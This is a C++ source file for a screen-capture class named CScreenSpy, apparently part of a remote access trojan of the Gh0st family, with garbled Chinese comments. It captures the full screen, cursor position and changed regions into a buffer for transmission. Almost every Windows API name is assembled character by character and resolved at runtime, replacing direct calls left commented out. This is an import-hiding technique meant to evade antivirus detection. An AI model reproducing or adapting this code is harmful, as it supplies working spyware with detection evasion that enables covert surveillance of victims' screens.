// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "../stdafx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "ScreenSpy.h"
#include "until.h"

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_STEP	19
#define OFF_SET		24
//////////////////////////////////////////////////////////////////////
#include "../Myfunction.h"  //�Զ��庯��

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

#ifdef _CONSOLE
#include <stdio.h>
#endif
CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	char DYrEN66[] = {'G','e','t','D','C','\0'};
	GetDCT pGetDC=(GetDCT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN66);
	char DYrEN67[] = {'G','e','t','D','e','s','k','t','o','p','W','i','n','d','o','w','\0'};
	GetDesktopWindowT pGetDesktopWindow=(GetDesktopWindowT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN67);
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = pGetDesktopWindow();
		m_hFullDC = pGetDC(m_hDeskTopWnd);
	}

	m_dwBitBltRop	= SRCCOPY;

	char DYrEN68[] = {'G','e','t','S','y','s','t','e','m','M','e','t','r','i','c','s','\0'};
	GetSystemMetricsT pGetSystemMetrics=(GetSystemMetricsT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN68);
	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	m_bAlgorithm	= ALGORITHM_SCAN; // Ĭ��ʹ�ø���ɨ���㷨
	m_dwLastCapture	= pGetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;
//    m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
//    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
    m_nFullWidth	= pGetSystemMetrics(SM_CXSCREEN);
    m_nFullHeight	= pGetSystemMetrics(SM_CYSCREEN);

    m_nIncSize		= 32 / m_biBitCount;

	m_nStartLine	= 0;

	char DYrEN75[] = {'C','r','e','a','t','e','C','o','m','p','a','t','i','b','l','e','D','C','\0'};
	CreateCompatibleDCT pCreateCompatibleDC=(CreateCompatibleDCT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN75);
//	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);
//	m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
//	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
//	m_hRectMemDC	= ::CreateCompatibleDC(NULL);
	m_hFullMemDC	= pCreateCompatibleDC(m_hFullDC);
	m_hDiffMemDC	= pCreateCompatibleDC(m_hFullDC);
	m_hLineMemDC	= pCreateCompatibleDC(NULL);
	m_hRectMemDC	= pCreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;

	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);

	char DYrEN72[] = {'C','r','e','a','t','e','D','I','B','S','e','c','t','i','o','n','\0'};
	CreateDIBSectionT pCreateDIBSection=(CreateDIBSectionT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN72);
//	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
//	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
//	m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);
	m_hLineBitmap	= pCreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= pCreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap	= pCreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	char DYrEN80[] = {'S','e','l','e','c','t','O','b','j','e','c','t','\0'};
	SelectObjectT pSelectObject=(SelectObjectT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN80);
//	::SelectObject(m_hFullMemDC, m_hFullBitmap);
//	::SelectObject(m_hLineMemDC, m_hLineBitmap);
//	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);
	pSelectObject(m_hFullMemDC, m_hFullBitmap);
	pSelectObject(m_hLineMemDC, m_hLineBitmap);
	pSelectObject(m_hDiffMemDC, m_hDiffBitmap);
	
	char DmDjm02[] = {'S','e','t','R','e','c','t','\0'};
	SetRectT pSetRect=(SetRectT)GetProcAddress(LoadLibrary("USER32.dll"),DmDjm02);
//	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);
	pSetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

	// �㹻��
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;

	m_rectBufferOffset = 0;
}

CScreenSpy::~CScreenSpy()
{
	char DYrEN90[] = {'D','e','l','e','t','e','D','C','\0'};
	DeleteDCT pDeleteDC=(DeleteDCT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN90);
	char DYrEN68[] = {'R','e','l','e','a','s','e','D','C','\0'};
	ReleaseDCT pReleaseDC=(ReleaseDCT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN68);
//	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
//	::DeleteDC(m_hLineMemDC);
//	::DeleteDC(m_hFullMemDC);
//	::DeleteDC(m_hRectMemDC);
//	::DeleteDC(m_hDiffMemDC);
	pReleaseDC(m_hDeskTopWnd, m_hFullDC);
	pDeleteDC(m_hLineMemDC);
	pDeleteDC(m_hFullMemDC);
	pDeleteDC(m_hRectMemDC);
	pDeleteDC(m_hDiffMemDC);

	char DYrEN78[] = {'D','e','l','e','t','e','O','b','j','e','c','t','\0'};
	DeleteObjectT pDeleteObject=(DeleteObjectT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN78);
//	::DeleteObject(m_hLineBitmap);
//	::DeleteObject(m_hFullBitmap);
//	::DeleteObject(m_hDiffBitmap);
	pDeleteObject(m_hLineBitmap);
	pDeleteObject(m_hFullBitmap);
	pDeleteObject(m_hDiffBitmap);

	if (m_rectBuffer)
		delete[] m_rectBuffer;
	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
	delete[]	m_lpbmi_rect;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	static LONG	nOldCursorPosY = 0;
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;

	SelectInputWinStation();

	// ����rect������ָ��
	m_rectBufferOffset = 0;

	// д��ʹ���������㷨
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// д����λ��
	POINT	CursorPos;
    char CtxPW58[] = {'G','e','t','C','u','r','s','o','r','P','o','s','\0'};
    GetCursorPosT pGetCursorPos=(GetCursorPosT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW58);
	pGetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// д�뵱ǰ�������
	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// ����Ƚ��㷨
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
		*lpdwBytes = m_rectBufferOffset + 
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);
		return m_rectBuffer;
	}

	// ���λ�÷��仯�����ȵ�������������仯����(�����仯���� + DEF_STEP)����ɨ��
	// ������
	int	nHotspot = max(0, CursorPos.y - DEF_STEP);
	for (
		int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
		i < m_nFullHeight; 
		i += DEF_STEP
		)
	{
		if (ScanChangedRect(i))
		{
			i += DEF_STEP;
		}
	}
	nOldCursorPosY = CursorPos.y;

	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
	*lpdwBytes = m_rectBufferOffset;

	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	// ���Ʒ���֡���ٶ�
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	while (pGetTickCount() - m_dwLastCapture < m_dwSleep)
		pSleep(1);
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	pInterlockedExchange((LPLONG)&m_dwLastCapture, pGetTickCount());

	return m_rectBuffer;
}



bool CScreenSpy::ScanChangedRect(int nStartLine)
{
	bool	bRet = false;
	LPDWORD p1, p2;

	char DYrEN91[] = {'B','i','t','B','l','t','\0'};
	BitBltT pBitBlt=(BitBltT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN91);
//	::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
	pBitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
	// 0 �����һ��
	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
	p2 = (PDWORD)m_lpvLineBits;

	char DmDjm02[] = {'S','e','t','R','e','c','t','\0'};
	SetRectT pSetRect=(SetRectT)GetProcAddress(LoadLibrary("USER32.dll"),DmDjm02);
//	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);
	pSetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);

	for (int j = 0; j < m_nFullWidth; j += m_nIncSize)
	{
		if (*p1 != *p2)
		{
			if (m_changeRect.right < 0)
				m_changeRect.left = j - OFF_SET;
			m_changeRect.right = j + OFF_SET;
		}
		p1++;
		p2++;
	}
	
	if (m_changeRect.right > -1)
	{
		m_changeRect.left   = max(m_changeRect.left, 0);
		m_changeRect.top    = max(m_changeRect.top, 0);
		m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
		// ���Ƹı������
		CopyRect(&m_changeRect);
		bRet = true;
	}

	return bRet;
}
void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	pInterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount Ϊ1 (�ڰ׶�ɫͼ) ��4 (16 ɫͼ) ��8 (256 ɫͼ) ʱ����ɫ������ָ����ɫ����С
biBitCount Ϊ16 (16 λɫͼ) ��24 (���ɫͼ, ��֧��) ��32 (32 λɫͼ) ʱû����ɫ��
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	// 16λ���Ժ��û����ɫ����ֱ�ӷ���
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95��Windows 98�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪλͼ���ܹ���ɨ��������
	
    Windows NT�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪ��0���������ִ��ʧ�ܣ���ô������0ֵ��Windows NT�������ø��������Ϣ�������callGetLastError������
	*/
	char DYrEN66[] = {'G','e','t','D','C','\0'};
	GetDCT pGetDC=(GetDCT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN66);
	HDC	hDC = pGetDC(NULL);

	char DYrEN93[] = {'C','r','e','a','t','e','C','o','m','p','a','t','i','b','l','e','B','i','t','m','a','p','\0'};
	CreateCompatibleBitmapT pCreateCompatibleBitmap=(CreateCompatibleBitmapT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN93);
	HBITMAP hBmp = pCreateCompatibleBitmap(hDC, 1, 1); // �߿�����Ϊ0

	char DYrEN92[] = {'G','e','t','D','I','B','i','t','s','\0'};
	GetDIBitsT pGetDIBits=(GetDIBitsT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN92);
	pGetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);

	char DYrEN68[] = {'R','e','l','e','a','s','e','D','C','\0'};
	ReleaseDCT pReleaseDC=(ReleaseDCT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN68);
	pReleaseDC(NULL, hDC);
	char DYrEN78[] = {'D','e','l','e','t','e','O','b','j','e','c','t','\0'};
	DeleteObjectT pDeleteObject=(DeleteObjectT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN78);
	pDeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;	
}

void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
	Gyfunction->my_memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}

LPVOID CScreenSpy::getFirstScreen()
{
	char DYrEN91[] = {'B','i','t','B','l','t','\0'};
	BitBltT pBitBlt=(BitBltT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN91);
//	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	pBitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

void CScreenSpy::CopyRect( LPRECT lpRect )
{
	int	nRectWidth = lpRect->right - lpRect->left;
	int	nRectHeight = lpRect->bottom - lpRect->top;

	LPVOID	lpvRectBits = NULL;
	// ����m_lpbmi_rect
	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
		* m_lpbmi_rect->bmiHeader.biHeight;

	char DYrEN72[] = {'C','r','e','a','t','e','D','I','B','S','e','c','t','i','o','n','\0'};
	CreateDIBSectionT pCreateDIBSection=(CreateDIBSectionT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN72);
//	HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);
	HBITMAP	hRectBitmap = pCreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);

	char DYrEN80[] = {'S','e','l','e','c','t','O','b','j','e','c','t','\0'};
	SelectObjectT pSelectObject=(SelectObjectT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN80);
//	::SelectObject(m_hRectMemDC, hRectBitmap);
	pSelectObject(m_hRectMemDC, hRectBitmap);

	char DYrEN91[] = {'B','i','t','B','l','t','\0'};
	BitBltT pBitBlt=(BitBltT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN91);
//	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
//	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);
	pBitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
	pBitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
	WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);

	char DYrEN78[] = {'D','e','l','e','t','e','O','b','j','e','c','t','\0'};
	DeleteObjectT pDeleteObject=(DeleteObjectT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN78);
	pDeleteObject(hRectBitmap);
}

UINT CScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}


void CScreenSpy::setCaptureLayer(BOOL bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	pInterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

BOOL CScreenSpy::SelectInputWinStation()
{
	BOOL bRet = ::SwitchInputDesktop();

	char DYrEN66[] = {'G','e','t','D','C','\0'};
	GetDCT pGetDC=(GetDCT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN66);
	char DYrEN67[] = {'G','e','t','D','e','s','k','t','o','p','W','i','n','d','o','w','\0'};
	GetDesktopWindowT pGetDesktopWindow=(GetDesktopWindowT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN67);
	char DYrEN68[] = {'R','e','l','e','a','s','e','D','C','\0'};
	ReleaseDCT pReleaseDC=(ReleaseDCT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN68);
	if (bRet)
	{
		if(m_hDeskTopWnd>0)
		    pReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = pGetDesktopWindow();
		m_hFullDC = pGetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}
//// ��ǰ������ȵ�
// LONG CScreenSpy::getKeyBoardHotspotY()
// {
// 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
// 	static	HWND	hWindow = GetForegroundWindow();
// 	static	DWORD	dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 	HWND	hCurrentWindow = GetForegroundWindow();
// 	if (hCurrentWindow != hWindow )
// 	{
// 		// Release
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, FALSE);
// 		hWindow = hCurrentWindow;
// 		dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, TRUE);
// 	}
// 	
// 	POINT	pt;
// 	if (GetCaretPos(&pt))
// 	{
// 		ClientToScreen(GetFocus(), &pt);
// 	}
// 	return pt.y;	
// }

void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // ɨ����
	// ɨ����Ļ
	int i;
	int	nToJump;
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	char DYrEN91[] = {'B','i','t','B','l','t','\0'};
	BitBltT pBitBlt=(BitBltT)GetProcAddress(LoadLibrary("GDI32.dll"),DYrEN91);
	for (i = 0, nToJump = 0; i < nHeight; i += nToJump)
	{
		unsigned int	nOther = nHeight - i;
		
		if (nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;
		pBitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
		pSleep(nJumpSleep);
	}
}

// ����Ƚ��㷨��ĺ���
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;

	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // ���ݼ�����
	// p1++ʵ�����ǵ�����һ��DWORD
	for (unsigned int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// һ�������ݿ鿪ʼ
		// д��ƫ�Ƶ�ַ
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// ��¼���ݴ�С�Ĵ��λ��
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // ���ݼ���������

		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;

		nCount += 4;
		i += 4, p1++, p2++;
		
		for (unsigned int j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;	
	}

	// nOffsetOffset ����д����ܴ�С
	return nOffsetOffset;

//	�о�����ٶȻ�û��C�㷨�죬��������
// 	int	Bytes = 0;
// 	__asm
// 	{
// 		mov     esi, [lpSource]
// 		mov     edi, [lpDest]
// 		mov     ebx, [lpBuffer]
// 		xor		ecx, ecx
// 		jmp		short Loop_Compare				// ��ʼ���бȽ�
// Loop_Compare_Continue:
// 		mov     eax, dword ptr [esi]
// 		cmp     eax, dword ptr [edi]
// 		je      short Loop_Compare_Equal		// ������, �����Ƚ�
// 		mov		[edi], eax						// д�벻ͬ�����ݵ�Ŀ����
// 		mov     edx, ebx						// edx ��¼��һ����ͬ��������ʼλ��
// 		mov     dword ptr [ebx], ecx
// 		add     ebx, 8
// 		mov     dword ptr [ebx], eax
// 		add     ebx, 4
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// 		jmp     short Loop_Block_Compare		// ���ݲ�ͬ������һ�����飬�����������бȽ�
// Loop_Block_Compare_Continue:	
// 		mov     eax, dword ptr [esi]
// 		cmp     eax, dword ptr [edi]
// 		jnz     short Loop_Block_Compare_Not_Equal // ���ݲ���ȣ�д��
// 		mov     eax, ecx
// 		sub     eax, dword ptr [edx]
// 		add     edx, 4
// 		mov     dword ptr [edx], eax
// 		add     eax, 8
// 		add     [Bytes], eax
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// 		jmp     short Loop_Block_Compare_Finish
// Loop_Block_Compare_Not_Equal:	
// 		mov     dword ptr [ebx], eax
// 		mov		[edi], eax					// д�벻ͬ�����ݵ�Ŀ����
// 		add     ebx, 4
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// Loop_Block_Compare:
// 		cmp     ecx, [dwSize]
// 		jb      short Loop_Block_Compare_Continue
// Loop_Block_Compare_Finish:
// 		cmp     ecx, [dwSize]
// 		jnz     short Loop_Compare
// 		mov     eax, ecx
// 		sub     eax, dword ptr [edx]
// 		add     edx, 4
// 		mov     dword ptr [edx], eax
// 		add     eax, 8
// 		add     [Bytes], eax
// 		jmp     short Loop_Compare
// Loop_Compare_Equal:
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// Loop_Compare:
// 		cmp     ecx, [dwSize]
// 		jb      short Loop_Compare_Continue
// 	}
// 	return Bytes;	
}